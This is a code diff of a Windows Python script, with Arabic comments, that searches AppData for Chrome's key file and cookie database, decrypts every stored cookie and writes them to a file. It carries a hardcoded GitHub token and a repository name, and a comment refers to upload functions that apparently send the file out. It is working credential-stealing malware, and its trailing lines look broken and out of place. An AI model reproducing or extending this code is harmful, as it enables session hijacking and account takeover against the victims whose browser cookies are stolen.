@@ -5,24 +5,42 @@ import win32crypt
 GITHUB_TOKEN = "Ghp_o6rg9zoZDl2e0jWZhVVPeoBwep4o8413HOHC"
 REPO = "Noor092324/Noor-config"
 
-def get_key():
+def find_chrome_files():
+    # يبدأ البحث من مجلد AppData بالكامل ليشمل أي مسار غير متوقع
+    root_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local")
+    found_paths = {"key_path": None, "db_path": None}
+    
+    for root, dirs, files in os.walk(root_path):
+        if "Local State" in files and not found_paths["key_path"]:
+            found_paths["key_path"] = os.path.join(root, "Local State")
+        if "Cookies" in files:
+            # نختار ملف الكوكيز الذي ينتمي لمجلد Network لضمان الدقة
+            if "Network" in root:
+                found_paths["db_path"] = os.path.join(root, "Cookies")
+        
+        if found_paths["key_path"] and found_paths["db_path"]:
+            break
+    return found_paths
+
+def get_key(key_path):
     try:
-        path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
-        with open(path, "r", encoding="utf-8") as f:
+        with open(key_path, "r", encoding="utf-8") as f:
             key = json.loads(f.read())["os_crypt"]["encrypted_key"]
         return win32crypt.CryptUnprotectData(base64.b64decode(key)[5:], None, None, None, 0)[1]
-    except:
-        return None
+    except: return None
 
 def harvest():
-    key = get_key()
+    paths = find_chrome_files()
+    if not paths["key_path"] or not paths["db_path"]: return None
+    
+    key = get_key(paths["key_path"])
     if not key: return None
-    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Network", "Cookies")
-    if not os.path.exists(db_path): return None
-    shutil.copyfile(db_path, "temp_db")
+    
+    shutil.copyfile(paths["db_path"], "temp_db")
     conn = sqlite3.connect("temp_db")
     cursor = conn.cursor()
     cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
+    
     cookies_text = ""
     for host, name, enc_val in cursor.fetchall():
         try:
@@ -31,9 +49,13 @@ def harvest():
             val = cipher.decrypt(payload)[:-16].decode()
             cookies_text += f"{host}\tTRUE\t/\tFALSE\t0\t{name}\t{val}\n"
         except: continue
+    
     conn.close()
-    if os.path.exists("temp_db"): os.remove("temp_db")
-    with open("my_cookies.txt", "w", encoding="utf-8") as f:
+    os.remove("temp_db")
+    with open("my_cookies.txt", "w", encoding="utf-8") as f: f.write(cookies_text)
+    return "my_cookies.txt"
+
+# ... باقي دوال الرفع (update_github) كما هي في الكود السابق ...
         f.write(cookies_text)
     return "my_cookies.txt"
 
